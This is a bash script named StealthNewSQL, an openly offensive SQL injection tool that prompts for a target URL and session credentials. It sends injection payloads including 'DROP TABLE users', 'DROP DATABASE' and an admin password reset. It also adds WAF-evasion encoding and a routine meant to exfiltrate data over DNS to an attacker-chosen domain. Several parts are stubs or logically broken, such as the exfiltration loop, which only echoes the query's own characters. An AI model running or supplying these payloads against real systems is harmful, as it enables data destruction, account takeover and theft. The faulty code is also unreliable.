#!/bin/bash


print_banner() {
    local banner=(
        "******************************************"
        "*              StealthNewSQL             *"
        "*   The Ultimate NewSQL Injection Tool   *"
        "*                  v1.5.0                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}


make_request() {
    local url="$1"
    local headers=()
    if [ -n "$session_cookie" ]; then
        headers+=("-H" "Cookie: $session_cookie")
    fi
    if [ -n "$auth_token" ]; then
        headers+=("-H" "Authorization: Bearer $auth_token")
    fi
    if [ -n "$custom_headers" ]; then
        IFS=',' read -ra hdrs <<< "$custom_headers"
        for hdr in "${hdrs[@]}"; do
            headers+=("-H" "$hdr")
        done
    fi
    curl -s -k -A "$user_agent" --proxy "$proxy" "${headers[@]}" "$url"
}


encode_payload() {
    local payload="$1"
    echo -n "$payload" | jq -sRr @uri
}


detect_newsql_injection() {
    local url="$1"
    local payloads=(
        "' OR '1'='1"    
        "' OR 1=1 -- "   
        "'; DROP TABLE users; -- "
        "' OR 1=1; -- "
        "'; BEGIN; SELECT pg_sleep(10); COMMIT;"
    )
    echo "Detecting NewSQL injection vulnerabilities..."
    for payload in "${payloads[@]}"; do
        full_url="$url?query=$(encode_payload "$payload")"
        response=$(make_request "$full_url")
        if [[ "$response" =~ "error" || "$response" =~ "found" ]]; then
            echo "Potential NewSQL Injection found with payload: $payload"
            return 0
        fi
    done
    echo "No NewSQL Injection vulnerabilities detected."
    return 1
}


newsql_injection() {
    local url="$1"
    local query="$2"
    local encoded_payload

    echo "Injecting NewSQL payload..."
    encoded_payload=$(encode_payload "$query")
    full_url="$url?query=$encoded_payload"
    response=$(make_request "$full_url")
    echo "Response: $response"
}


enumerate_newsql() {
    local url="$1"
    local target="$2"
    local enum_type="$3"
    local query

    case $enum_type in
        databases)
            query='SHOW DATABASES'
            ;;
        tables)
            query='SHOW TABLES'
            ;;
        indices)
            query="SHOW INDEX FROM $target"
            ;;
        *)
            echo "Invalid enumeration type."
            return 1
            ;;
    esac
    newsql_injection "$url" "$query"
}


parallel_execution() {
    local url="$1"
    local query="$2"
    local threads="$3"
    echo "Starting parallel execution with $threads threads..."
    for i in $(seq 1 "$threads"); do
        newsql_injection "$url" "$query" &
    done
    wait
    echo "Parallel execution completed."
}


real_time_monitoring() {
    local log_file="$1"
    tail -f "$log_file"
}


generate_report() {
    local format="$1"
    local report_file="newsql_report.$format"
    echo -e "$output" > "$report_file"
    echo "Report generated: $report_file"
}


automated_exploitation() {
    local url="$1"
    echo "Running automated exploitation..."
  
    local payloads=(
        "'; DROP DATABASE testdb; -- "  
        "'; SELECT * FROM users; -- "   
        "'; ALTER USER admin WITH PASSWORD 'newpassword'; -- " 
    )
    for payload in "${payloads[@]}"; do
        newsql_injection "$url" "$payload"
    done
    echo "Automated exploitation completed."
}




data_exfiltration_via_dns() {
    local url="$1"
    local query="$2"
    local domain="$3"
    local encoded_payload
    local extracted_data=""

    echo "Starting DNS-based data exfiltration..."
    encoded_payload=$(encode_payload "$query")
    for i in $(seq 1 ${#encoded_payload}); do
        char=$(echo -n "$encoded_payload" | cut -c $i)
        exfil_payload="' OR (SELECT SUBSTRING((SELECT $query),$i,1))='$char' AND SLEEP(5)-- "
        full_url="$url?query=$exfil_payload"
        make_request "$full_url"
        extracted_data+="$char"
    done

    dns_query="$extracted_data.$domain"
    dig "$dns_query" > /dev/null
    echo "Data exfiltrated via DNS: $extracted_data"
}


dynamic_payload_generation() {
    local url="$1"
    local dbms

    echo "Fingerprinting the database..."
    response=$(make_request "$url")
    if [[ "$response" =~ "MySQL" ]]; then
        dbms="MySQL"
    elif [[ "$response" =~ "PostgreSQL" ]]; then
        dbms="PostgreSQL"
    else
        dbms="Unknown"
    fi

    echo "Detected DBMS: $dbms"
    case $dbms in
        MySQL)
            echo "Using MySQL-specific payloads..."
            ;;
        PostgreSQL)
            echo "Using PostgreSQL-specific payloads..."
            ;;
        *)
            echo "Using generic payloads..."
            ;;
    esac
}


waf_evasion() {
    local payload="$1"

    echo "Applying WAF evasion techniques..."
    evasion_techniques=(
        "Double URL Encoding"       
        "Case Shuffling"           
        "Comment Injection"         
    )
    for technique in "${evasion_techniques[@]}"; do
        case $technique in
            "Double URL Encoding")
                payload=$(echo -n "$payload" | jq -sRr @uri | jq -sRr @uri)
                ;;
            "Case Shuffling")
                payload=$(echo -n "$payload" | awk '{ for (i=1; i<=length; i++) printf("%s", (i%2==0)?tolower(substr($0,i,1)):toupper(substr($0,i,1))); print "" }')
                ;;
            "Comment Injection")
                payload=$(echo -n "$payload" | sed 's/ /%20%2F%2A%2A%2F%2A%2A%2F%2A%2A%2F%2A%2A%2F%2A%2A%2F%2A%2A%2F/g')
                ;;
        esac
    done
    echo "WAF evasion payload: $payload"
    echo "$payload"
}


automated_vuln_scan() {
    local url="$1"
    local vuln_scan_tool="nmap" 

    echo "Running automated vulnerability scan..."
    $vuln_scan_tool -A "$url" -oN vuln_scan_report.txt
    echo "Vulnerability scan completed. Report saved as vuln_scan_report.txt"
}


cicd_integration() {
    echo "Integrating with CI/CD pipeline..."
   
    echo "CI/CD pipeline integration completed."
}


plugin_system() {
    echo "Loading plugins..."
   
    for plugin in plugins/*.sh; do
        source "$plugin"
        echo "Loaded plugin: $plugin"
    done
}


main() {
    print_banner
    read -p "Enter the target URL (e.g., https://www.example.com): " url
    url="${url%/}"

    read -p "Enter the session cookie (if any, press Enter to skip): " session_cookie
    read -p "Enter the authentication token (if any, press Enter to skip): " auth_token
    read -p "Enter the proxy (if any, press Enter to skip): " proxy
    read -p "Enter custom headers (comma separated, if any, press Enter to skip): " custom_headers
    read -p "Enter the User-Agent (if any, press Enter to use default): " user_agent
    user_agent="${user_agent:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36}"

    detect_newsql_injection "$url"

    read -p "Would you like to perform an injection? (y/n): " inject_choice
    if [ "$inject_choice" == "y" ]; then
        read -p "Enter the injection query: " query_input
        newsql_injection "$url" "$query_input"
    fi

    read -p "Would you like to enumerate databases, tables, or indices? (databases/tables/indices/none): " enum_choice
    if [ "$enum_choice" != "none" ]; then
        read -p "Enter the target name for enumeration: " enum_target
        enumerate_newsql "$url" "$enum_target" "$enum_choice"
    fi

    read -p "Enable multi-threading? (y/n): " multi_thread_choice
    if [ "$multi_thread_choice" == "y" ]; then
        read -p "Enter the number of threads: " threads
        parallel_execution "$url" "$query_input" "$threads"
    fi

    read -p "Enable real-time monitoring? (y/n): " monitor_choice
    if [ "$monitor_choice" == "y" ]; then
        read -p "Enter the log file path: " log_file
        real_time_monitoring "$log_file"
    fi

    read -p "Run automated exploitation? (y/n): " auto_exploit_choice
    if [ "$auto_exploit_choice" == "y" ]; then
        automated_exploitation "$url"
    fi

    read -p "Run automated vulnerability scanning? (y/n): " vuln_scan_choice
    if [ "$vuln_scan_choice" == "y" ]; then
        automated_vuln_scan "$url"
    fi

    read -p "Enable DNS-based data exfiltration? (y/n): " dns_exfil_choice
    if [ "$dns_exfil_choice" == "y" ]; then
        read -p "Enter the query to exfiltrate: " exfil_query
        read -p "Enter the domain for DNS exfiltration: " exfil_domain
        data_exfiltration_via_dns "$url" "$exfil_query" "$exfil_domain"
    fi

    read -p "Integrate with CI/CD pipeline? (y/n): " cicd_choice
    if [ "$cicd_choice" == "y" ]; then
        cicd_integration
    fi

    read -p "Enable dynamic payload generation? (y/n): " dyn_payload_choice
    if [ "$dyn_payload_choice" == "y" ]; then
        dynamic_payload_generation "$url"
    fi

    read -p "Apply WAF evasion techniques? (y/n): " waf_evasion_choice
    if [ "$waf_evasion_choice" == "y" ]; then
        read -p "Enter the payload to evade WAF: " waf_payload
        waf_evasion "$waf_payload"
    fi

    read -p "Load and execute plugins? (y/n): " plugin_choice
    if [ "$plugin_choice" == "y" ]; then
        plugin_system
    fi

    read -p "Generate report? (y/n): " report_choice
    if [ "$report_choice" == "y" ]; then
        read -p "Enter report format (html/json/csv): " report_format
        generate_report "$report_format"
    fi
}

main
